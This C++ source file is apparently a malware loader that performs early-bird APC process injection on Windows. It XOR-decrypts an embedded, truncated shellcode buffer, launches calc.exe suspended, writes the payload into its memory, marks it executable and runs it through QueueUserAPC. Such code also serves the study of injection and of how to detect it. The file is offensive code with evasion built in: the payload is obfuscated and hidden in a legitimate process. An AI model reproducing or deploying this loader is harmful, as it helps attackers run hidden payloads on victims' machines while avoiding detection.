#include <stdio.h>
#include <Windows.h>
#include <iostream>

void xorDecrypt(unsigned char* data, int length, const std::string& key) {
	int keyLength = key.length();
	for (int i = 0; i < length; i++) {
		data[i] = data[i] ^ key[i % keyLength];
	}
}

int main() {

	std::cout << "Current process PID is " << GetCurrentProcessId() << std::endl;
	system("pause");

    // shellcode
	unsigned char buf[] =
		"\x98\x7b\xe0\x96\xc1\x98\xb4\x69\x30\x6e\x2a\x62\x38\x34"
        "..."

	int bufLentgh = sizeof(buf) - 1;

	xorDecrypt(buf, bufLentgh, "<DecryptionKey>");

	SIZE_T payload_size = sizeof(buf);

	STARTUPINFOA startprocess = { 0 };
	PROCESS_INFORMATION processinfo = { 0 };
	PVOID remotebuffer = 0;
	DWORD oldprotection = NULL;

	char processPath[] = "C:\\Windows\\System32\\calc.exe";
	if (!CreateProcessA(processPath, NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &startprocess, &processinfo)) {
		std::cout << "Failed to Create a New Process ! " << std::endl;;
		return 1;
	}

	HANDLE hprocess = processinfo.hProcess;
	HANDLE hthread = processinfo.hThread;

	remotebuffer = VirtualAllocEx(hprocess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (remotebuffer == NULL) {
		std::cout << "Failed to allocate the memory!" << std::endl;
		CloseHandle(hprocess);
		CloseHandle(hthread);
		return 1;
	}

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remotebuffer;

	if (!WriteProcessMemory(hprocess, remotebuffer, buf, payload_size, NULL)) {
		std::cout << "Failed to Write the memory!" << std::endl;
		CloseHandle(hprocess);
		CloseHandle(hthread);
		return 1;
	}

	if (!VirtualProtectEx(hprocess, remotebuffer, payload_size, PAGE_EXECUTE_READ, &oldprotection)) {
		std::cout << "Failed to change the memory protection!" << std::endl;
		CloseHandle(hprocess);
		CloseHandle(hthread);
		return 1;
	}

	QueueUserAPC((PAPCFUNC)apcRoutine, hthread, NULL);

	ResumeThread(hthread);
	return 0;
}
